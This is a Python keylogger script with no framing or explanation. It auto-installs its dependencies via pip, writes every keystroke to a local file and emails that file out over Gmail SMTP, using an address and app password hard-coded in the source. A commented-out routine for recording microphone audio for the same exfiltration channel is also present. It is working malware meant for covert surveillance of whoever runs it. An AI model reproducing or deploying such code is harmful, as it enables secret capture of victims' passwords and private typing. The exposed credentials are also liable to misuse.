try:
    import logging
    import os
    import platform
    import smtplib
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)



finally:
    EMAIL_ADDRESS = "stevensgibson3@gmail.com"
    EMAIL_PASSWORD = "osnufvgvwzkzgipu"
    SEND_REPORT_EVERY = 3600
    
outputfile = "keylog.txt"


def on_press(key) :
    try:
          with open(outputfile, 'a') as f:
            f.write(key.char)
    except AttributeError:
          with open(outputfile, 'a') as f:
            if str(key) == "Key.space":
                 f.write(" ")

            elif str(key) == "Key.enter":
                 f.write(" \n")

            elif str(key) == "Key.right" or str(key) == "Key.left" or str(key) == "Key.up" or str(key) == "Key.down" or str(key) == "Key.shift" or str(key) == "Key.shift_r" or str(key) == "Key.ctrl_l" or str(key) == "Key.ctrl_r" or str(key) == "Key.alt_l" or str(key) == "Key.alt_r" or str(key) == "Key.tab":
                 f.write(" ")

            elif str(key) == "Key.backspace":
               f.seek(f.tell() - 1, os.SEEK_SET)
               f.truncate()
            else :
                 f.write(f'[ {str(key)} ]')
          
          send_mail(outputfile, EMAIL_ADDRESS)
     


def send_mail(outputfile, toaddr) :
     fromaddr = EMAIL_ADDRESS
     msg = MIMEMultipart()
     msg['From'] = fromaddr
     msg['To'] = toaddr
     msg['Subject'] = "Log File"
     body = "Log file attached."
     msg.attach(MIMEText(body, 'plain'))
     attachment = open(outputfile, "rb")
     p = MIMEBase('application', 'octet-stream')
     p.set_payload((attachment).read())
     encoders.encode_base64(p)
     p.add_header('Content-Disposition', "attachment; filename= %s" % outputfile)
     msg.attach(p)
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
     s.login(fromaddr, EMAIL_PASSWORD)
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()

def report():
     send_mail(outputfile, EMAIL_ADDRESS)
     os.remove(outputfile)
     timer = threading.Timer(SEND_REPORT_EVERY, report)
     timer.start()

# def microphone(self):
#             fs = 44100
#             seconds = SEND_REPORT_EVERY
#             obj = wave.open('sound.wav', 'w')
#             obj.setnchannels(1) 
#             obj.setsampwidth(2)
#             obj.setframerate(fs)
#             myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
#             obj.writeframesraw(myrecording)
#             sd.wait()

#             self.send_mail('sound.wav', EMAIL_ADDRESS)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()